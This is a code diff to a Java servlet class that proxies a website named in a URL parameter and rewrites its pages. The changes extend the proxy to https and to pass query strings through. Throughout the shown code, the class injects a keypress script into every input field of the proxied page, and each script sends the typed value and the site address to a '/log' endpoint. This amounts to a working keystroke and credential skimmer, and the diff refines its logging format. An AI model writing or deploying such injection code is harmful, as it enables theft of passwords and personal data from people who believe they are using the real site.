@@ -41,7 +41,6 @@ public class WebsiteProcessor {
 		String endPoint = request.getRequestURI();
 		setBase(request.getParameter("url"));
 		String url = getBase()+endPoint;
-		//System.out.println(url);
 		String html = getRawResponseAndSetBasic(url,"GET",request,response);
 		String modifiedHtml = processHTML(html, url.contains(".js"));
 		response.getWriter().write(modifiedHtml);
@@ -75,7 +74,7 @@ public class WebsiteProcessor {
 		Elements inputs = doc.select("input");
 		for(Element input:inputs){
 			if(input.attr("id")!=null && !input.attr("id").equals("")){
-				String jqueryStr = "'"+input.attr("id")+"-'+ "+"$('#"+input.attr("id")+"').val()";
+				String jqueryStr = "'key "+input.attr("id")+" value '+ "+"$('#"+input.attr("id")+"').val()";
 				String ajaxString = "$.ajax({url:'/log',data:{url:'"+getBase()+"',data:"+jqueryStr+"}})";
 				String complete = "<script> $( '#"+input.attr("id")+"' ).keypress(function() {"+ajaxString+"}) </script>";
 				doc.append(complete);
@@ -84,8 +83,14 @@ public class WebsiteProcessor {
 		return doc.toString();
 	}
 	public String getRawResponseAndSetBasic(String url,String method,HttpServletRequest request, HttpServletResponse response) throws IOException{
-		URL u = new URL("http://"+url);
+		String link = "https://"+url;
+		String query = request.getQueryString();
+		if(query!=null && !query.equals("null")){
+			link+="?"+query;
+		}
+		URL u = new URL(link);
 		HttpURLConnection  conn = (HttpURLConnection) u.openConnection();
+		System.out.println(link);
 		conn.setReadTimeout(5000);
 		conn.setRequestMethod(method);
 		conn.setUseCaches(false);
@@ -97,7 +102,6 @@ public class WebsiteProcessor {
 		if(method.equals("POST")){
 			conn.setDoOutput(true);
 		}
-
 		conn.setInstanceFollowRedirects( true );
 		conn.setRequestProperty("User-Agent", USER_AGENT);
 		conn.setRequestProperty("Accept",
